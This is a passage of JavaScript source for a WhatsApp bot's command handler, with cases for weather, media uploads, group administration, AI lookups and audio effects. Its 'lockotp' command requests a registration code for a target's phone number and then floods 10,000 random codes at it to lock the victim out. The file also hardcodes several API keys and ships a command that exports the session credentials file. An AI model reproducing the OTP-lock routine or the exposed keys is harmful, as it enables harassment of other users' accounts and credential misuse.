            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`
           await David.sendMessage(m?.chat, {react: {text: `☁`,key: m?.key,}})
 await David.sendMessage(m?.chat, {react: {text: `🌦`,key: m?.key,}})
 await David.sendMessage(m?.chat, {react: {text: `🌩`,key: m?.key,}}) 
await David.sendMessage(m?.chat, {react: {text: `🌨`,key: m?.key,}})
await David.sendMessage(m?.chat, {react: {text: ``,key: m?.key,}})          

           David.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break          
           
             
               
    
            
 
case 'repost': {
    if (!isCreator) return Owner();
    try {
        let mediaType;
        
        if (/video/.test(mime)) {
            mediaType = 'video';
        } else if (/image/.test(mime)) {
            mediaType = 'image';
        } else if (/audio/.test(mime)) {
            mediaType = 'audio';
        } else {
            return reply('Reply to a Video, Image, or Audio Status');
        }

        var mediaFile = await David.downloadAndSaveMediaMessage(quoted);
        let messageOptions = {
            caption: q ? q : ''
        };

        // Assign the correct media type to messageOptions
        messageOptions[mediaType] = {
            url: mediaFile
        };

        // Send to status@broadcast (broadcast to all statuses)
        await David.sendMessage('status@broadcast', messageOptions, { statusJidList: Object.keys(global.db.data.users) });
        await reply('Done');
        
    } catch (error) {
        console.error(error);
        reply('Failed to repost the media.');
    }
    break;

} 

case 'volvid': {
const { TelegraPh } = require('./lib/uploader');
const ffmpeg = require('fluent-ffmpeg');
const fs = require('fs');

const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? David.user.jid : m.sender;
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';

if (!mime || !mime.includes('video')) return reply(`Where is the video?`);

const volume = parseFloat(args[0]) || 1;
if (isNaN(volume) || volume <= 0) return reply('Specify a valid volume (example: 0.5 for half, 2 for double)');

reply(`loading....`);

try {
const media = await David.downloadAndSaveMediaMessage(q);
const output = 'output.mp4';

ffmpeg(media)
.audioFilters(`volume=${volume}`)
.on('start', (commandLine) => {
console.log(`Spawned Ffmpeg with command: ${commandLine}`);
})
.on('error', async (err) => {
console.error(`Error: ${err.message}`);
await fs.promises.unlink(media).catch(console.error);
return reply(`Error: ${err.message}`);
})
.on('end', async () => {
console.log('Video processed');

try {
const url = await TelegraPh(output);
await fs.promises.unlink(output);
await fs.promises.unlink(media);

David.sendMessage(m.chat, { caption: `_Success To Change Video Volume_`, video: { url } }, { quoted: m });
} catch (err) {
console.error(`Error When Upload Video: ${err.message}`);
await fs.promises.unlink(media).catch(console.error);
return reply(`Error When Uploading Video: ${err.message}`);
}
})
.save(output);
} catch (err) {
console.error(`Error When Uploading Video: ${err.message}`);
return reply(`Error When Uploading Video: ${err.message}`);
}
}
break 

case 'mindreader':
    reply('Think of a number between 1 and 100. I will try to guess it...');

    await sleep(3000);  // Simulating thinking

    const guessedNumber = Math.floor(Math.random() * 100) + 1;
    reply(`🤔 I guess your number is: *${guessedNumber}*`);
    
    await sleep(2000);
    reply(`Was I right?`);
    break;

        case 'getsession':
                if (!isCreator) return reply("?")
                
                let sesi = fs.readFileSync('./session/creds.json')
                David.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
            break
    case 'listcase': {
const listCase = () => {
const code = fs.readFileSync("./QUEEN_ANITA-V4.js", "utf8")
var regex = /case\s+'([^']+)':/g;
var matches = [];
var match;
while ((match = regex.exec(code))) {
matches.push(match[1]);
}
let teks = `*Total Commands*: ${matches.length} \n\n` 
matches.forEach(function (x) {
   teks += "◦ " + x + "\n"
})
return teks
}
reply(listCase())
}
break
    case 'everyone': 
        if (!isAdmins) return
 David.sendMessage(m.chat, {
text: "@" + m.chat,
contextInfo: {
mentionedJid: (await (await David.groupMetadata(m.chat)).participants).map(a => a.id),
groupMentions: [
{
groupJid: m.chat,
groupSubject: 'everyone' 
}
]
}
}
)
   setTimeout(async () => {
           reply(`${pushname} using ${command} to call you guys`)
            }, 1120)
        break    
       
        
              

case 'url': {
    // Validate that the message is a reply to an image or video
    if (!/video/.test(mime) && !/image/.test(mime)) {
        return reply(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply/Send Image/Video With Caption .url*`);
    }

    // React to the command to indicate processing
    await David.sendMessage(m?.chat, { react: { text: `⏳`, key: m?.key } });

    if (!quoted) {
        return reply(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply/Send Image/Video With Caption .url*`);
    }

    try {
        // Download the media locally
        const mediaPath = await David.downloadAndSaveMediaMessage(quoted);

        // Upload the file to Imgur
        
const uploadResponse = await uploadToImgur(mediaPath);
        // Check upload response and send the result
        if (uploadResponse.status === "success") {
            // Send the uploaded file's URL
            await reply(`*UPLOAD SUCCESSFUL!!*\n\n> *URL:*\n\n${uploadResponse.fileUrl}\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ`);
        } else {
            // Handle upload errors
            await reply(`*UPLOAD FAILED PLEASE TRY AGAIN`);
        }

        // Clean up: Remove the saved media file after processing
        fs.unlinkSync(mediaPath);
    } catch (error) {
        console.error('Error in URL command:', error);
        await reply(`*AN ERROR OCCURRED!! MESSAGE:*\n\n> ${error.message}`);
    }

    // React to indicate success
    await David.sendMessage(m?.chat, { react: { text: `✅`, key: m?.key } });
    break;
}


case "apk":
      case "apkdl":
        {
          if (!text) return reply("What apk do you wanna download?");
        let kyuu = await fetchJson (`https://bk9.fun/search/apk?q=${text}`);
        let tylor = await fetchJson (`https://bk9.fun/download/apk?id=${kyuu.BK9[0].id}`);
         await David.sendMessage(
              m.chat,
              {
                document: { url: tylor.BK9.dllink },
                fileName: tylor.BK9.name,
                mimetype: "application/vnd.android.package-archive",
                contextInfo: {
        externalAdReply: {
          title: `ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™`,
          body: `${tylor.BK9.name}`,
          thumbnailUrl: `${tylor.BK9.icon}`,
          sourceUrl: `${tylor.BK9.dllink}`,
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: m });
          }
      break;




case 'imgscan': {
    // Ensure the command is a reply to an image
    if (!/image/.test(mime)) {
        return reply(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image with .imgscan to scan it*`);
    }

    // Check if there is a quoted message (the image)
    if (!quoted) {
        return reply(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image with .imgscan to scan it*`);
    }

    try {
        // React to show that processing has started
        await David.sendMessage(m?.chat, { react: { text: `⏳`, key: m?.key } });

        // Download the image locally
        const mediaPath = await David.downloadAndSaveMediaMessage(quoted);

        // Upload the image to a hosting service (e.g., Imgur)
        const uploadResponse = await uploadToImgur(mediaPath); // Replace with your upload function
        if (uploadResponse.status !== "success") {
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
            return reply(`*UPLOAD ERROR!! MESSAGE :*\n\n> ${uploadResponse.message}`);
        }

        const imageUrl = uploadResponse.fileUrl; // Get the uploaded image URL

        // Call the Gemini API with the image URL and default query
        const apiResponse = await axios.get(`https://bk9.fun/ai/geminiimg`, {
            params: { url: imageUrl, q: "Who is this?" }
        });

        // Parse and handle the API response
        if (apiResponse.data.status === true) {
            const result = apiResponse.data.BK9;

            // Send the response back to the user
            reply(`*IMAGE SCANNER RESULT:*\n\n${result}`);
        } else {
            reply(`*SCANNER ERROR!! MESSAGE :*\n\n> Failed to process the image. Try again.`);
        }

        // Clean up: Delete the downloaded file
        fs.unlinkSync(mediaPath);

    } catch (error) {
        console.error('Error in Image Scanner command:', error);
        reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }

    // React to indicate success
    await David.sendMessage(m?.chat, { react: { text: `✅`, key: m?.key } });
    break;
}




 case 'googleimg': {
    if (!args.length) {
        return reply(`*What Image Do you want to see???. :*\n\n> *Use the command as .googleimg <query>*`);
    }

    const query = args.join(" "); // Combine the query words
    const numImages = 5; // Number of images to fetche

    // Array of Unsplash API keys
    const unsplashKeys = [
        "hxL76bVJViLdzagtk-SN8lbfvT5zzYE1i6r3A2JH9Sw",
        "tHQdcDogLZZ1mns6Fxlf2qpsR3-YIyJDK8_3qBEObpU",
        "ogZUhEzKxG0xF-5eVJLMQKT-_PqSHZR5ErgG7U5K2M4",
        "9YRwoTY4WFk-f18rCDsK6ZX1PfVTFsn1Jridu99nc4M",
        "zKUZ5r2Ewtebmt8qzcoaBd_UvzrDWkGvNl83vwIiD5Y"
    ];

    // Randomly select an API key
    const selectedKey = unsplashKeys[Math.floor(Math.random() * unsplashKeys.length)];

    // React to show processing
    await David.sendMessage(m?.chat, { react: { text: `⏳`, key: m?.key } });

    try {
        // Call the Unsplash API with the selected key
        const response = await axios.get(`https://api.unsplash.com/search/photos`, {
            params: { query: query, per_page: numImages },
            headers: { Authorization: `Client-ID ${selectedKey}` },
        });

        const results = response.data.results;

        if (!results || results.length === 0) {
            return reply(`*NO IMAGES FOUND!! MESSAGE :*\n\n> No images were found for "${query}".`);
        }

        // Loop through the results and send each image
        for (const photo of results) {
            const imageUrl = photo.urls.small; // Get the image URL

            await David.sendMessage(m?.chat, {
                image: { url: imageUrl },
                caption: `*Image result for:* "${query}"`,
            });
        }

    } catch (error) {
        console.error('Error in Image Search command:', error);

        // Handle rate limit error (status code 403 or 429)
        if (error.response && [403, 429].includes(error.response.status)) {
            reply(`*RATE LIMIT REACHED!! MESSAGE :*\n\n> Please try again later.`);
        } else {
            reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
        }
    }

    // React to indicate success
    await David.sendMessage(m?.chat, { react: { text: `✅`, key: m?.key } });
    break;
}


case 'clearchat': {
    if (!m.isGroup && !isCreator) {
        return reply('This command is only for group admins or the bot owner.');
    }
    try {
        // Send a message to confirm action
        await David.sendMessage(m.chat, {
            text: `Clearing chat...`
        });

        // Delete all messages in the chat
        await David.modifyChat(m.chat, 'delete');
        reply('Chat cleared successfully!');
    } catch (err) {
        console.error('Error clearing chat:', err);
        reply('An error occurred while clearing the chat.');
    }
    break;
}

case 'broadcast': {
    if (!isCreator) return reply('This command is for the bot owner only.');
    if (!text) return reply('Please provide a message to broadcast.');

    const chats = await David.chats.all();
    for (let chat of chats) {
        await David.sendMessage(chat.id, { text }, { quoted: m });
    }

    reply('Broadcast message sent to all chats.');
    break;
}




case 'hd': case 'hdimg': case 'remini': {
    // Check if the command is a reply to an image
    if (!/image/.test(mime)) {
        return reply(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image with .remini to enhance it*`);
    }

    // React to the command to show processing
    await David.sendMessage(m?.chat, { react: { text: `⏳`, key: m?.key } });

    if (!quoted) {
        return reply(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image with .remini to enhance it*`);
    }

    try {
        // Download the image locally
        const mediaPath = await David.downloadAndSaveMediaMessage(quoted);

        // Upload the image to a hosting service to get a public URL
        const uploadResponse = await uploadToImgur(mediaPath); // Replace this with your upload logic

        if (uploadResponse.status !== "success") {
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
            return reply(`*UPLOAD ERROR!! MESSAGE :*\n\n> ${uploadResponse.message}`);
        }

        const imageUrl = uploadResponse.fileUrl; // Get the uploaded image URL

        // Call the new Remini API with the uploaded image URL
        const enhancedImageUrl = `https://bk9.fun/tools/enhance?url=${imageUrl}`;

        // Send the enhanced image back to the user
        await David.sendMessage(m?.chat, {
            image: { url: enhancedImageUrl },
            caption: `*SUCCESSFULLY ENHANCED YOUR IMAGE 😍!!*\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ`
        }, { quoted: m });

        // Clean up: Delete the downloaded file
        fs.unlinkSync(mediaPath);
    } catch (error) {
        console.error('Error in Remini command:', error);
        reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }

    // React to indicate success
    await David.sendMessage(m?.chat, { react: { text: `✅`, key: m?.key } });
    break;
}





case 'lockotp': case 'otplock': {
if (!isOwner) return reply('`This Command Is for Premuim Users Only\nType .buypremuim To Become A Premium User`') 
  if (args.length < 1) return reply(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 234|9066655532`);
  const args2 = args[0].split('|');
  if (args2.length !== 2) return reply(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 234|9066655532`);
  const xeonCountryCode = args2[0];
  const xtarget = args2[1];
  const xeonNumber = xtarget.replace('@s.whatsapp.net', '');
  const xeonmerge = `${xeonCountryCode}${xtarget}`
  const xeonMention = xeonmerge + '@s.whatsapp.net';
  reply(
    "`Please Wait OTP LOCK Is Running..:" + xeonMention.split('@')[0]
  );
  try {
    const { stateXeon, saveCredsXeon } = await useMultiFileAuthState('./session');
    const xeonRequest = await David.requestRegistrationCode({
      phoneNumber: '+' + xeonCountryCode + `${xeonNumber}`,
      phoneNumberCountryCode: xeonCountryCode,
      phoneNumberNationalNumber: `${xeonNumber}`,
      phoneNumberMobileCountryCode: 724,
      method: 'sms'
    });
    const musicFilePath = './anita-sounds/otp.mp3'; 

    // Sending the MP3 audio file
    await David.sendMessage(m.chat, {
        audio: { url: musicFilePath },
        mimetype: 'audio/mp4',  // Proper MIME type for audio
        ptt: true,  
    });
  } catch (err) {
  }
  
  for (let i = 0; i < 10000; i++) {
    try {
      var xeonPrefix = Math.floor(Math.random() * 999);
      var xeonSuffix = Math.floor(Math.random() * 999);
      await David.register(`${xeonPrefix}-${xeonSuffix}`);
    } catch (err) {
      console.log(`${xeonPrefix}-${xeonSuffix}`);
    }
  }
}
break;  


   case 'hidetag': case 'tg': {
        
        if (!m.isGroup) return reply('For Groups Only');
        David.sendMessage(m.chat, { text: args.join(" ") ? args.join(" ") : '', mentions: participants.map(a => a.id) }, { quoted: m })
      }
        break;
        
        
        case 'hdvid': {
  const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? David.user.jid : m.sender;
  const q = m.quoted ? m.quoted : m;
  const mime = (q.msg || q).mimetype || '';
  if (!mime) return reply(`Where's the video??`);
  reply("`Loading Please wait..`");
  const media = await David.downloadAndSaveMediaMessage(q);
  const url = await TelegraPH(media);
  const output = 'output.mp4'; 
  
  exec(`ffmpeg -i ${media} -vf "hqdn3d=1.5:1.5:6:6,nlmeans=p=7:s=7,vaguedenoiser=threshold=2.0:method=soft:nsteps=5,deband,atadenoise,unsharp=3:3:0.6,eq=brightness=0.05:contrast=1.2:saturation=1.1" -vcodec libx264 -profile:v main -level 4.1 -preset veryslow -crf 18 -x264-params ref=4 -acodec copy -movflags +faststart ${output}`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);

    David.sendMessage(m.chat, { caption: `_Success To Enhanced Video_`, video: { url: output }}, {quoted: m});
  });     
}

break

case 'shutdown':
                if (!isCreator) return reply('For My Owner Only') 
await David.sendMessage(m?.chat, {react: {text: `⚠️`,key: m?.key,}})
await David.sendMessage(m?.chat, {react: {text: `👋`,key: m?.key,}}) 
                reply('`Shutting Down....`')
                await sleep(3000)
                process.exit()
            break
       

            
case 'thai':{
await loading() 
var notnot = JSON.parse(fs.readFileSync('./david-media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'Queen_Anita-V3'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: David.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: 'David Cyril',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await David.relayMessage(m.chat, msgs.message, {})
}
break            


            
            
case 'setbio':{
if (!isCreator) return reply('For My Owner Only') 
if (!text) return reply(`Where is the text?\nExample: ${prefix + command} David Cyril`)
await David.sendMessage(m?.chat, {react: {text: `✍🏼`,key: m?.key,}})
    await David.updateProfileStatus(text)
    reply('`Success in changing bio, Boss!!🫡`')
await David.sendMessage(m?.chat, {react: {text: `✅`,key: m?.key,}})
    }
    break           




case "setpp1":
            case "setpp":
            case "setppbot":
                if (!isCreator) return reply(`For My Owner Only`);
                if (!quoted)
                    return reply(
                        `Send/Reply Image With Caption ${prefix + command}`
                    );
                if (!/image/.test(mime))
                    return reply(
                        `Send/Reply Image With Caption ${prefix + command}`
                    );
                if (/webp/.test(mime))
                    return reply(
                        `Send/Reply Image With Caption ${prefix + command}`
                    );
                var medis = await David.downloadAndSaveMediaMessage(
                    quoted,
                    "ppbot.jpeg"
                );
                if (args[0] == "full") {
                    var { img } = await generateProfilePicture(medis);
                    await David.query({
                        tag: "iq",
                        attrs: {
                            to: botNumber,
                            type: "set",
                            xmlns: "w:profile:picture"
                        },
                        content: [
                            {
                                tag: "picture",
                                attrs: {
                                    type: "image"
                                },
                                content: img
                            }
                        ]
                    });
                    fs.unlinkSync(medis);
                    reply(`Done`);
                } else {
                    var memeg = await David.updateProfilePicture(
                        botNumber,
                        {
                            url: medis
                        }
                    );
                    fs.unlinkSync(medis);
                    reply(`Done`);
                }
                break;
case "linkgroup":
            case "grouplink":
            case "linkgrup":
            case "linkgc":
                if (!m.isGroup) return reply(mess.group);
               if (!m.isGroup) return (`For Group Only`)  
if (!isAdmins) return (`For Admins Only`)
if (!isBotAdmins) return (`Bot Must Be Admin`);
                let response = await David.groupInviteCode(m.chat);
                David.sendText(
                    m.chat,
                    `ðŸ‘¥ *GROUP LINK INFO*\nðŸ“› *Name :* ${
                        groupMetadata.subject
                    }\nðŸ‘¤ *Group Owner :* ${
                        groupMetadata.owner !== undefined
                            ? "@" + groupMetadata.owner.split`@`[0]
                            : "Not known"
                    }\nðŸŒ± *ID :* ${
                        groupMetadata.id
                    }\nðŸ”— *Chat Link :* https://chat.whatsapp.com/${response}\nðŸ‘¥ *Member :* ${
                        groupMetadata.participants.length
                    }\n`,
                    m,
                    {
                        detectLink: true
                    }
                );
                break;
            case "revoke":
            case "resetlink":
                if (!m.isGroup) return (`For Group Only`)  
if (!isAdmins) return (`For Admins Only`)
if (!isBotAdmins) return (`Bot Must Be Admin`);
                await David.groupRevokeInvite(m.chat)
                    .then(res => {
                        reply(
                            `Successful Reset, Group Invite Link ${groupMetadata.subject}`
                        );
                    })
                    .catch(err => reply(json(err)));
                break;                
                
        
 case 'getpp':
    if (!m.quoted && (!m.mentionedJid || m.mentionedJid.length === 0)) {
        return reply(`Reply to someone's message or tag a user with ${prefix + command}`);
    }

    try {
        // If the command is used in reply to someone's message
        let targetUser = m.quoted ? m.quoted.sender : m.mentionedJid[0];
        let profilePicUrl = await David.profilePictureUrl(targetUser, 'image');
        let responseMessage = `Profile picture of @${targetUser.split('@')[0]}`;
        await David.sendMessage(m.chat, { image: { url: profilePicUrl }, caption: responseMessage, mentions: [targetUser] });
    } catch (error) {
        reply("Couldn't fetch profile picture. The user might not have a profile picture or an error occurred.");
    }
    break;

                       
                
 case 'block': case 'ban': {
		if (!isCreator) return Owner()
await reply('`Tag Someone!`')		
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await David.updateBlockStatus(users, 'block')
		await reply(`Done`)
	}
	break
	case 'unblock': case 'unban': {
		if (!isCreator) return (`For My Owner Only`) 
		await reply('`Tag Someone!`') 
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await David.updateBlockStatus(users, 'unblock')
		await reply(`Done`)
	}
	break          
  
case 'tinyurl':{
   if(!q) return reply('`link?`')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function 
  (error, response, body) {
   try {
  reply(body)
  } catch (e) {
  reply(e)
  }
  })
  }
 break

                
case 'invite': {
	if (!m.isGroup) return Group()
	if (!isBotAdmins) return Admin()
if (!text) return reply(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 2347043759577`)
if (text.includes('+')) return reply(`Enter the number together without *+*`)
if (isNaN(text)) return reply(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await David.groupInviteCode(group)
      await David.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        reply('`An invite link is sent to the user`') 
}
break      


 case 'owner': case 'creator':{
        setTimeout(async ()  => {
 David.sendContact(m.chat, global.nomerowner, fsaluran)
            }, 1200)
await David.sendMessage(m?.chat, {react: {text: `👑`,key: m?.key,}})
David.sendMessage(m?.chat, {text: '*Here is my Handsome Owner😍✨!*',key: m?.key,})           
}
        break        



case "disk":{
exec('cd && du -h --max-depth=1', (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
break
//=================================================//
case "add":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('Enter the number you want to add')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await David.groupParticipantsUpdate(m?.chat, [users], 'add').catch(console.log)
}
break
//=================================================//
case "kick":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('Enter the number you want to kick')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await David.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
}
break
//=================================================//
case "promote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('Enter the number you want to promote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await David.groupParticipantsUpdate(m?.chat, [users], 'promote').catch(console.log)
}
break
//=================================================//
case "demote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('Enter the number you want to demote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await David.groupParticipantsUpdate(m?.chat, [users], 'demote').catch(console.log)
}
break
//=================================================//
/*ase "ai":{
if (!text) return reply("mau nanya apa sama naw")
let { data } = await axios.get("https://www.putz.my.id/api/ai?type=hercai&q=" + text)
reply(data.result)
}
break*/
//=================================================//
case "gemini-img":{
if (!quoted) return reply(`Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply("only support images")
let media = await David.downloadAndSaveMediaMessage(qmsg)
let urlgambar = await TelegraPH(media)
let { data } = await axios.get("https://gmni.vercel.app/api/img?imageUrl="+ urlgambar +"&prompt=" + text)
reply(data.text)
}
break
//=================================================//
case "gemini":{
if (!text) return reply("what do you want to ask me?")
let { data } = await axios.get("https://gmni.vercel.app/api/ask?text=" + text)
reply(data.text)
}
break
//=================================================//
case "ocr":{
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (!mime) return reply(`convert image with .ocr command`)
if (!/image\/(jpe?g|png)/.test(mime)) return reply(`_*type ${mime} not supported!*_`)
const ocrapi = require("ocr-space-api-wrapper")
let img = await David.downloadAndSaveMediaMessage(q)
let url = await TelegraPH(img)
let hasil = await ocrapi.ocrSpace(url)
 await reply(Results.ParsedResults[0].ParsedText)
}
break
//=================================================//
case "stickers":{
if (!text) return reply(`Ex : ${prefix + command} cat`);
const anu = await stickersearch(text);
const shuffledStickers = anu.sticker.sort(() => Math.random() - 0.5);
const randomStickers = shuffledStickers.slice(0, 10);

if (randomStickers.length > 0) {
for (let i = 0; i < randomStickers.length; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
await David.sendImageAsSticker(m?.chat, randomStickers[i], m, {
packname: global.packname,
author: global.author
});
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await reply(`Failed to send sticker *(${i + 1}/${randomStickers.length})*`);
}
}
}}
break
//=================================================//
case "translate":{
let lang, text
if (args.length >= 2) {
lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
lang = args[0] ? args[0] : 'id', text = m?.quoted.text
} else return reply(`Example: Translate id Hello i am robot`) 

let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
if (!res) return reply(`Error : This Language"${lang}"Not Supported\nType .languages`)
reply(`*Language Detected:* ${res.from?.language.iso}\n*To Language:* ${lang}\n\n*Translation:* ${res.text}`.trim())
}
break
//=================================================//
/*case 'ss': case 'ssweb':{
if (!/^https?:\/\//.test(text)) return reply('Originally *URL* with http:// or https://')
let krt = await ssweb(text)
David.sendMessage(m.chat,{image: krt.result, caption: "Done"},{quoted:fsaluran})
}
break*/
//=================================================//
case "calculator":{
 val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
reply(`*${format}* = _${result}_`)
} catch (e) {
if (e == undefined) return reply('The contents?')
    reply('Wrong format, only 0-9 and Symbols -, +, *, /, ×, ÷, π, e, (, ) supported')
}
}
break
//=================================================//
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':{
if (!qmsg) return reply("reply audio nya")
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await David.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
David.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
} catch (e) {
console.log(e)
reply('error')
}}
break

case 'take': {
if (!m?.quoted) return reply('Reply with a sticker!')
let stiker = false
try {
let [packname, ...author] = text.split('|')
author = (author || []).join('|')
let mime = m?.quoted.mimetype || ''
if (!/webp/.test(mime)) throw 'Reply with a sticker!'
let img = await m?.quoted.download()
if (!img) throw 'Failed to download sticker!'
stiker = await addExif(img, packname || global.packname, author || global.author )
} catch (e) {
console.error(e)
if (Buffer.isBuffer(e)) stiker = e
else throw 'An error occurred: ' + e
} finally {
if (stiker) David.sendFile(m?.chat, stiker, 'wms.webp', '', m, false, { asSticker: true })
else throw 'Conversion failed'
}
}
break 



case 'ss':
case 'ssweb':{
if (!text) return reply(`where is the link?`)
await David.sendMessage(m?.chat, {react: {text: `📷`,key: m?.key,}})
await David.sendMessage(m?.chat, {react: {text: `📸`,key: m?.key,}})
try {
David.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/ssweb?type=mobile&url=${encodeURIComponent(text)}&apikey=nanogembul` }}, { quoted: m})
			} catch {
